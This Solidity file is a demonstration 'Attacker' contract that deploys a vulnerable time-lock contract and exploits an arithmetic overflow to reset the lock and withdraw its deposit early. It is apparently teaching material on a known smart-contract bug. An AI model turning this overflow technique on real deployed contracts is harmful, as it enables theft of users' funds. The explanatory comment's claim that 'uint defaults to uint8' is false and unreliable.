//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "./TimeLockVulnerable.sol";

/// @title The attacker contract
/// @author GusGusGusGus
/// @notice Attack the TimeLockVulnerable contract with arithmetic overflow
/// @dev Explain to a developer any extra details
contract Attacker{

    TimeLockVulnerable timeLocker;

    constructor() public{
        timeLocker = new TimeLockVulnerable();
    }

    fallback() external payable {}

    /// @notice Attack function
    /// @dev Calls increaseTimeLock with the arithmetic overflow.
    function attack() public payable {
        timeLocker.deposit();

        /*  An overflow in Solidity occurs when a number is incremented beyond its maximum value. 
            uint defaults to uint8, with 8 bits, so it is a range of integers between 0 and 2^8-1 = 255
            this means that if you add 1 to binary 11111111, it resets back to 00000000
            if t = current locktime, find x so that x + t = 2**256  = 0
            x = -t
            2**256 = uint256(-1) + 1
            so: x = uint256(-1) + 1 - t
        */
        uint256 MAX_INT = uint256(-1);
        timeLocker.increaseTimeLock(
            MAX_INT + 1 - timeLocker.locktime(address(this))
        );
        timeLocker.withdraw();
    }
}